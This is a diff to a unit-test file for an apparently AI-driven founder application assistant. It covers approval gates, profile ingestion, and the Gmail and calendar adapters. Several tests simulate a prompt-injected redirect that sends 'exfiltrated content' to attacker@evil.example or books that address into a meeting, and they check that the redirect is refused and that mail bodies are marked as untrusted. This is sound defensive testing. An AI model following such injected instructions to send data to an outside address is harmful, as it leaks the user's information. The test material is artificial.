@@ -60,12 +60,97 @@ class TestChecklist:
         assert "material:2 essays" in keys and "material:deck" in keys
         assert all(i["status"] == "PENDING" for i in items)
 
+    def test_null_materials_from_extraction_are_safe(self):
+        items = pipeline_service.initial_checklist(None)
+        assert len(items) == 8
+        assert not any(item["key"].startswith("material:") for item in items)
+
+
+class TestSelectionIdempotency:
+    async def test_null_materials_start_application_and_surface_readiness(
+            self, fake_store):
+        fake_store.opportunities["opp-null"] = {
+            "id": "opp-null", "state": "SHORTLISTED",
+            "name": "Google Africa Applied AI Lab",
+            "required_materials": None, "application_url": None,
+            "created_at": "", "updated_at": "",
+        }
+
+        selected = await pipeline_service.choose_opportunity("founder", "opp-null")
+
+        assert selected["status"] == "success"
+        assert selected["current_step"] == "INTERVIEWING"
+        assert selected["active_program_requirements"] == []
+        assert selected["readiness"]["ready_for_portal"] is False
+        assert set(selected["readiness"]["missing"]) == {
+            "verified application URL", "required materials"}
+
+    async def test_duplicate_selection_returns_one_existing_application(
+            self, fake_store):
+        fake_store.opportunities["opp-one"] = {
+            "id": "opp-one", "state": "SHORTLISTED", "name": "One Program",
+            "required_materials": ["deck"], "created_at": "", "updated_at": "",
+        }
+
+        first = await pipeline_service.choose_opportunity("founder", "opp-one")
+        second = await pipeline_service.choose_opportunity("founder", "opp-one")
+
+        assert first["application_id"] == second["application_id"]
+        assert first["already_exists"] is False
+        assert second["already_active"] is True
+        assert len(fake_store.applications) == 1
+        transitions = [row for row in fake_store.audit
+                       if row["action"] == "state_transition"]
+        assert len(transitions) == 1
+
+
+class TestBoardProjection:
+    async def test_founder_suffix_duplicate_is_collapsed_without_deleting_records(
+            self, fake_store):
+        for oid, name in (("a", "Google Africa Applied AI Lab"),
+                          ("b", "Google Africa Applied AI Lab for Founders")):
+            fake_store.opportunities[oid] = {
+                "id": oid, "name": name, "state": "SHORTLISTED",
+                "deadline": "2026-08-31", "created_at": "2026-08-20",
+                "required_materials": [], "raw_excerpt": "source",
+            }
+
+        board = await pipeline_service.board("founder")
+
+        assert len(board["opportunities"]["SHORTLISTED"]) == 1
+        assert len(fake_store.opportunities) == 2
+
+    async def test_legacy_random_id_application_is_reused(self, fake_store):
+        fake_store.opportunities["opp-legacy"] = {
+            "id": "opp-legacy", "state": "SHORTLISTED", "name": "Legacy Program",
+            "required_materials": [], "created_at": "", "updated_at": "",
+        }
+        fake_store.applications["legacy-random-id"] = {
+            "id": "legacy-random-id", "founder_id": "founder",
+            "opportunity_id": "opp-legacy", "state": "DRAFTING",
+            "checklist": [{"key": "interview", "status": "DONE"}],
+            "created_at": "", "updated_at": "",
+        }
+
+        selected = await pipeline_service.choose_opportunity("founder", "opp-legacy")
+
+        assert selected["application_id"] == "legacy-random-id"
+        assert selected["current_step"] == "DRAFTING"
+        assert len(fake_store.applications) == 1
+
 
 # ---- approval gate (docs/12) ----------------------------------------------
 
 class TestApprovalGate:
     async def test_full_lifecycle(self, fake_store):
-        aid = "app1"
+        from tests.conftest import bind_fill_report
+        from tests.unit.test_issue_regressions import fake_store_create_application
+
+        # A real submit approval is bound to a fill report (docs/02
+        # subject_hash); an unbound one now fails closed by design.
+        aid = await fake_store_create_application(
+            fake_store, state="AWAITING_SUBMIT_APPROVAL")
+        await bind_fill_report(fake_store, aid)
         req = await approval_service.request_approval(
             aid, founder_id="founder", session_id="session-1")
         assert "token" not in str(req)  # never the token
@@ -90,8 +175,14 @@ class TestApprovalGate:
         assert len(refused) == 2  # both blocked attempts audited
 
     async def test_double_resolve_refused(self, fake_store):
+        from tests.conftest import bind_fill_report
+        from tests.unit.test_issue_regressions import fake_store_create_application
+
+        aid = await fake_store_create_application(
+            fake_store, state="AWAITING_SUBMIT_APPROVAL")
+        await bind_fill_report(fake_store, aid)
         req = await approval_service.request_approval(
-            "app1", founder_id="founder", session_id="session-1")
+            aid, founder_id="founder", session_id="session-1")
         await approval_service.resolve(
             req["approval_id"], "deny", "founder", "session-1")
         again = await approval_service.resolve(
@@ -199,7 +290,8 @@ class TestIngestionGate:
         profile = await profile_service.get_profile("f1")
         assert profile.get("facts", {}) == {}  # nothing written without confirmation
 
-        proposals = (await profile_service.propose_profile_updates(result["ingestion_id"]))["proposals"]
+        proposals = (await profile_service.propose_profile_updates(
+            "f1", result["ingestion_id"]))["proposals"]
         confirm = await profile_service.confirm_profile_updates(
             "f1", result["ingestion_id"], approved=[proposals[0]["id"]], rejected=[],
             rejection_reasons=[])
@@ -222,8 +314,7 @@ class TestIngestionGate:
 
 
 class TestAutoApply:
-    """Autonomous ingestion (docs/06 §bootstrap): confident + non-conflicting
-    proposals apply themselves; conflicts and low-confidence items wait."""
+    """Legacy uncited proposals never bypass the durable evidence pipeline."""
 
     async def test_clean_proposals_apply_themselves(self, fake_store):
         profile_service.set_extract_fn(lambda artifact, fid: [
@@ -233,11 +324,13 @@ class TestAutoApply:
              "evidence_quote": "…", "confidence": "high"}])
         result = await profile_service.ingest_document("f1", "upload", "deck.pdf", "companydoc_a")
         auto = await profile_service.auto_apply_profile_updates("f1", result["ingestion_id"])
-        assert auto["auto_applied"] == 2
-        assert auto["needs_founder"] == []
+        assert auto["auto_applied"] == 0
+        assert len(auto["needs_founder"]) == 2
         profile = await profile_service.get_profile("f1")
-        assert profile["facts"]["sector"] == "fintech"
-        assert profile["voice_rules"][0]["rule"] == "no buzzwords"
+        assert "sector" not in profile["facts"]
+        assert profile["voice_rules"] == []
+        assert all("hash-matching source citation" in item["reason"]
+                   for item in auto["needs_founder"])
         profile_service.set_extract_fn(None)
 
     async def test_conflict_is_held_for_the_founder(self, fake_store):
@@ -276,8 +369,8 @@ class TestAutoApply:
              "evidence_quote": "…", "confidence": "high"}])
         result = await profile_service.ingest_document("f1", "upload", "deck.pdf", "companydoc_d")
         auto = await profile_service.auto_apply_profile_updates("f1", result["ingestion_id"])
-        assert auto["auto_applied"] == 1
-        assert auto["needs_founder"] == []
+        assert auto["auto_applied"] == 0
+        assert "hash-matching source citation" in auto["needs_founder"][0]["reason"]
         profile_service.set_extract_fn(None)
 
 
@@ -289,6 +382,11 @@ class TestDedupHash:
     def test_deterministic_and_case_insensitive(self):
         assert pipeline_service.dedup_hash(" Meridian ", "HTTP://X ") == \
             pipeline_service.dedup_hash("meridian", "http://x")
+
+    def test_founder_audience_suffix_is_same_program_identity(self):
+        assert pipeline_service.dedup_hash(
+            "Google Africa Applied AI Lab", "") == pipeline_service.dedup_hash(
+            "Google Africa Applied AI Lab for Founders", "")
 
 
 class TestSweep:
@@ -314,6 +412,16 @@ class TestSweep:
     def teardown_method(self):
         discovery_service.set_search_fn(None)
         discovery_service.set_extract_fn(None)
+
+    def test_context_is_bounded_and_applied_to_every_profile_query(self):
+        context = "  fintech\nNigeria   pre-seed  "
+        queries = discovery_service._queries_from_profile(
+            {"facts": {"sector": "AI", "geography": "Africa"}}, context=context)
+        assert len(queries) == 3
+        assert all("founder-supplied constraints: fintech Nigeria pre-seed" in query
+                   for query in queries)
+        assert "\n" not in "".join(queries)
+        assert len(discovery_service.normalize_discovery_context("x" * 900)) == 500
 
     async def test_search_lane_saves_relevant_programs(self, fake_store, monkeypatch):
         self._wire(monkeypatch,
@@ -578,7 +686,14 @@ class TestGmailAdapter:
         assert result["status"] == "success"
         kinds = {e["id"]: e["kind"] for e in result["events"]}
         assert kinds == {"m1": "confirmation", "m2": "result_positive"}
-        # rescan: everything already processed → no events
+        # The scan must NOT mark anything processed: marking before the caller
+        # commits its follow-up/notification lost the message permanently on a
+        # crash in that window. A rescan before mark_processed re-delivers.
+        assert processed == []
+        redelivered = await gmail_adapter.scan()
+        assert {e["id"] for e in redelivered["events"]} == {"m1", "m2"}
+        # Only after the caller settles the work does a rescan go quiet.
+        await gmail_adapter.mark_processed([e["id"] for e in result["events"]])
         second = await gmail_adapter.scan()
         assert second["events"] == []
 
@@ -709,7 +824,8 @@ class TestAlexMailbox:
         assert result["status"] == "needs_approval" and result["error"] is True
         assert sent == []  # nothing left the building
 
-    async def test_send_with_approval_sends_and_consumes(self, monkeypatch):
+    async def test_send_with_approval_sends_and_consumes(
+            self, monkeypatch, fake_store):
         sent = []
         consumed = []
         alex_mailbox.set_service_factory(lambda: _FakeAlexGmail(_FakeAlexMessages(sent=sent)))
@@ -733,42 +849,46 @@ class TestAlexMailbox:
         assert result["status"] == "error" and "recipient" in result["message"]
 
     async def test_approval_is_content_bound_not_just_gate_bound(self, monkeypatch):
-        """A granted approval carries the approved to/subject/body — a later
-        call with DIFFERENT arguments (e.g. a prompt-injected redirect) must
-        send the approved message, never the new one."""
+        """A granted approval covers ONE exact message. A later call with
+        DIFFERENT arguments (e.g. a prompt-injected redirect) is REFUSED.
+
+        The old behaviour substituted the approved details over the call args
+        and audited `drift_ignored` — so asking to send message B under an
+        approval for message A sent A and reported success: the wrong message
+        and a false receipt."""
+        from services import approval_service
         sent = []
         alex_mailbox.set_service_factory(lambda: _FakeAlexGmail(_FakeAlexMessages(sent=sent)))
-        async def _valid(target, **kwargs):
-            return {"id": "ap1", "details": {"to": "program@example.org",
-                                             "subject": "Question",
-                                             "body": "Hi — approved text"}}
+        approved = {"to": "program@example.org", "subject": "Question",
+                    "body": "Hi — approved text"}
+        bound = approval_service.action_subject_hash(
+            "send_email", "email:general", approved)
+        async def _valid(target, gate="", founder_id="", session_id="",
+                         subject_hash=None):
+            if subject_hash is not None and subject_hash != bound:
+                return None  # a bound lookup only matches its own subject
+            return {"id": "ap1", "details": approved, "subject_hash": bound}
         monkeypatch.setattr("services.alex_mailbox.firestore.find_valid_approval", _valid)
-        async def _claim(aid): return True
+        claims = []
+        async def _claim(aid):
+            claims.append(aid)
+            return True
         monkeypatch.setattr("services.alex_mailbox.firestore.claim_approval", _claim)
-        audits = []
-        async def _audit(*a, **k): audits.append(a)
+        async def _audit(*a, **k): pass
         monkeypatch.setattr("services.alex_mailbox.firestore.audit", _audit)
         result = await alex_mailbox.send_email(
             "attacker@evil.example", "New subject", "exfiltrated content",
             founder_id="founder", session_id="session-1")
-        assert result["status"] == "success"
-        assert "program@example.org" in result["message"]
-        import base64 as _b64
-        import email as _email
-        msg = _email.message_from_string(
-            _b64.urlsafe_b64decode(sent[0]["raw"]).decode())
-        assert msg["to"] == "program@example.org"
-        assert msg["subject"] == "Question"
-        body_text = msg.get_payload(decode=True).decode()
-        assert body_text == "Hi — approved text"
-        assert "exfiltrated" not in body_text
-        assert any("drift_ignored" in a for a in audits)
+        assert result["status"] == "error"
+        assert result["error_code"] == "approval_binding_mismatch"
+        assert sent == []   # neither the new message NOR the approved one
+        assert claims == []  # and the founder's grant is left unconsumed
 
     async def test_scan_classifies_and_dedupes(self, monkeypatch):
         processed = []
         async def _processed(): return list(processed)
         monkeypatch.setattr("services.alex_mailbox.firestore.get_processed_alex_ids", _processed)
-        async def _mark(ids): processed.extend(ids)
+        async def _mark(ids): processed.extend(i for i in ids if i not in processed)
         monkeypatch.setattr("services.alex_mailbox.firestore.add_processed_alex_ids", _mark)
         async def _scan(s): pass
         monkeypatch.setattr("services.alex_mailbox.firestore.set_last_alex_scan", _scan)
@@ -780,8 +900,13 @@ class TestAlexMailbox:
         result = await alex_mailbox.scan_unread()
         assert result["status"] == "success"
         assert [e["kind"] for e in result["events"]] == ["confirmation", "result_negative"]
+        # The fetch marks NOTHING (docs/24 §9.2): until the caller has committed
+        # the domain effect, a crash must leave the messages reprocessable.
+        assert processed == []
+        assert result["unmarked_event_ids"] == ["m1", "m2"]
+        # The caller marks them afterwards; only then is a rescan a no-op.
+        await alex_mailbox.mark_processed(result["unmarked_event_ids"])
         assert set(processed) == {"m1", "m2"}
-        # rescan is idempotent — same messages are skipped
         result2 = await alex_mailbox.scan_unread()
         assert result2["events"] == []
 
@@ -808,7 +933,10 @@ class TestAlexMailbox:
         alex_mailbox.set_service_factory(lambda: _FakeAlexGmail(msgs))
         result = await alex_mailbox.get_message("m1")
         assert result["status"] == "success"
-        assert result["message"]["body"] == "Full body text here"
+        # returned, but demarcated as untrusted data (docs/18 rule, applied to mail)
+        assert result["injection_suspected"] is False
+        assert "Full body text here" in result["message"]["body"]
+        assert result["message"]["body"].startswith("<<<UNTRUSTED")
 
 
 class _FakeCalendarInsertEvents(_FakeCalendarEvents):
@@ -849,7 +977,8 @@ class TestCalendarBooking:
         assert result["status"] == "needs_approval" and result["error"] is True
         assert inserted == []  # nothing on the calendar
 
-    async def test_booking_with_approval_inserts_and_consumes(self, monkeypatch):
+    async def test_booking_with_approval_inserts_and_consumes(
+            self, monkeypatch, fake_store):
         inserted, consumed = [], []
         calendar_adapter.set_service_factory(lambda: _FakeCalendarInsert(inserted))
         async def _valid(target, **kwargs): return {"id": "ap1"}
@@ -877,19 +1006,30 @@ class TestCalendarBooking:
         assert back["status"] == "error" and "after start" in back["message"]
 
     async def test_booking_is_content_bound_not_just_gate_bound(self, monkeypatch):
-        """A granted approval books EXACTLY the approved meeting — a later
-        call with different attendees/times must not override it."""
-        inserted = []
+        """A granted approval covers ONE meeting. A call for a different one is
+        REFUSED — it must not book the approved meeting instead (which is what
+        substituting the approved details used to do, while reporting success
+        for the meeting that was asked for). See test_calendar_binding.py."""
+        inserted, claims = [], []
         calendar_adapter.set_service_factory(lambda: _FakeCalendarInsert(inserted))
-        async def _valid(target, **kwargs):
-            return {"id": "ap1", "details": {
-                "summary": "Intro call",
-                "start": "2026-08-25T14:00:00+01:00",
-                "end": "2026-08-25T14:30:00+01:00",
-                "attendees": ["investor@fund.com"]}}
+        approved = {"id": "ap1", "gate": "book_meeting",
+                    "subject_hash": "sha256:the-approved-meeting",
+                    "details": {
+                        "summary": "Intro call",
+                        "start": "2026-08-25T14:00:00+01:00",
+                        "end": "2026-08-25T14:30:00+01:00",
+                        "attendees": ["investor@fund.com"]}}
+        async def _valid(target, subject_hash=None, **kwargs):
+            if subject_hash is not None and subject_hash != approved["subject_hash"]:
+                return None  # bound lookup: this grant is for another meeting
+            return approved
         monkeypatch.setattr("services.calendar_adapter.firestore.find_valid_approval", _valid)
-        async def _claim(aid): return True
+        async def _claim(aid):
+            claims.append(aid)
+            return True
         monkeypatch.setattr("services.calendar_adapter.firestore.claim_approval", _claim)
+        async def _request(*a, **k): return {"status": "success", "approval_id": "ap2"}
+        monkeypatch.setattr("services.approval_service.request_approval", _request)
         audits = []
         async def _audit(*a, **k): audits.append(a)
         monkeypatch.setattr("services.calendar_adapter.firestore.audit", _audit)
@@ -897,9 +1037,8 @@ class TestCalendarBooking:
             "Totally different meeting", "2026-08-26T09:00:00+01:00",
             "2026-08-26T10:00:00+01:00", ["attacker@evil.example"],
             founder_id="founder", session_id="session-1")
-        assert result["status"] == "success"
-        booked = inserted[0]
-        assert booked["summary"] == "Intro call"
-        assert booked["attendees"] == [{"email": "investor@fund.com"}]
-        assert booked["start"]["dateTime"].startswith("2026-08-25T14:00")
-        assert any("drift_ignored" in a for a in audits)
+        assert result["status"] == "error"
+        assert result["error_code"] == "approval_binding_mismatch"
+        assert inserted == []   # neither meeting was booked
+        assert claims == []     # and the grant for the real meeting is intact
+        assert not any("drift_ignored" in a for a in audits)
